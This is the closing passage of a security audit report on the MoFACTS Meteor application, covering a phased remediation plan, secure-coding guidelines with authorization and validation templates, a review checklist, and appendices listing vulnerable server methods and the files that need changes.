14. **Add Secure Cookie Flags** (#20)
15. **Fix Path Traversal** (#21)
16. **Improve Cryptography** (#23)
17. **Implement Audit Logging** (#24)
18. **Strengthen Password Policy** (#25)
19. **Add Security Headers** (#26)

### Phase 4: Long-term (90+ days) - Low Severity & Infrastructure

20. **Remove Verbose Error Messages** (#18, #22)
21. **Implement Rate Limiting** (#17)
22. **Add CSRF Protection** (#16)
23. **Fix Race Conditions** (#14)
24. **Address Minor Issues** (#27-31)

---

## Security Best Practices Going Forward

### Development Guidelines

1. **Always Check Authorization**
   ```javascript
   // Template for all sensitive methods
   if (!this.userId) {
     throw new Meteor.Error(401, 'Authentication required');
   }
   if (!Roles.userIsInRole(this.userId, ['admin', 'teacher'])) {
     throw new Meteor.Error(403, 'Insufficient permissions');
   }
   ```

2. **Always Validate Input**
   ```javascript
   import { check, Match } from 'meteor/check';

   Meteor.methods({
     myMethod(param1, param2) {
       check(param1, String);
       check(param2, Match.Integer);
       // ... method logic
     }
   });
   ```

3. **Never Trust Client Data**
   - Validate on server
   - Sanitize before database storage
   - Escape before output

4. **Use Parameterized Queries**
   - Never concatenate user input into queries
   - Use MongoDB query operators properly

5. **Implement Defense in Depth**
   - Multiple layers of security
   - Fail securely (deny by default)
   - Least privilege principle

### Code Review Checklist

- [ ] Authorization check present for sensitive operations
- [ ] Input validation using `check()`
- [ ] No use of `eval()` or similar dangerous functions
- [ ] No triple-brace `{{{ }}}` syntax for user content
- [ ] Parameterized database queries
- [ ] Secure password handling
- [ ] Proper error handling without information leakage
- [ ] Audit logging for sensitive actions
- [ ] Rate limiting on public endpoints
- [ ] HTTPS enforced for all connections

### Testing Recommendations

1. **Security Testing**
   - Implement automated security scanning (OWASP ZAP, Snyk)
   - Regular penetration testing
   - Code security reviews before deployment

2. **Access Control Testing**
   - Test each method with different user roles
   - Verify IDOR protection
   - Test authorization bypasses

3. **Input Validation Testing**
   - Fuzz testing for injection vulnerabilities
   - Boundary testing for all inputs
   - Test with malicious payloads

---

## Conclusion

This security audit identified significant vulnerabilities in the MoFACTS application that require immediate attention. The most critical issues involve:

1. Missing authorization checks allowing unauthorized data access
2. Insecure TLS configuration exposing all HTTPS traffic
3. XSS vulnerabilities through unescaped output
4. Weak password reset mechanism enabling account takeover
5. Code injection via eval() usage

**Recommended Next Steps:**

1. Prioritize fixing the 5 Critical vulnerabilities within 7 days
2. Assign Phase 1 remediation tasks to development team
3. Implement security code review process
4. Schedule follow-up security audit after Phase 1 completion
5. Establish ongoing security monitoring and testing program

**Estimated Total Remediation Effort:** 6-8 weeks with a dedicated team

---

## Appendix A: Vulnerable Method Summary

| Method Name | File | Line | Issue | Severity |
|-------------|------|------|-------|----------|
| `removeTurkById` | methods.js | 2614 | No auth check | Critical |
| `assignAccessors` | methods.js | 2808 | No auth check | Critical |
| `transferDataOwnership` | methods.js | 2816 | No auth check | Critical |
| `removeAssetById` | methods.js | 3233 | No auth check | Critical |
| `toggleTdfPresence` | methods.js | 3237 | No auth check | Critical |
| `deleteAllFiles` | methods.js | 3623 | No auth check | High |
| `getAccessors` | methods.js | 2788 | Info disclosure | High |
| `getAccessorsTDFID` | methods.js | 2778 | Info disclosure | High |
| `sendPasswordResetEmail` | methods.js | 2742 | Weak security | Critical |
| `resetPasswordWithSecret` | methods.js | 2833 | No validation | Critical |

---

## Appendix B: Files Requiring Changes

**Critical Priority:**
- `mofacts/server/methods.js` (multiple methods)
- `mofacts/client/views/experiment/card.html`
- `mofacts/client/views/experiment/instructions.html`
- `mofacts/client/index.html`
- `mofacts/client/lib/router.js`

**High Priority:**
- `mofacts/server/publications.js`
- `mofacts/common/Collections.js`
- `mofacts/server/turk_methods.js`

**Medium Priority:**
- Server configuration files
- Template helpers
- Client-side validation code

---

**Report Prepared By:** Security Assessment Team
**Date:** October 12, 2025
**Next Review:** After Phase 1 completion (estimated 7-14 days)
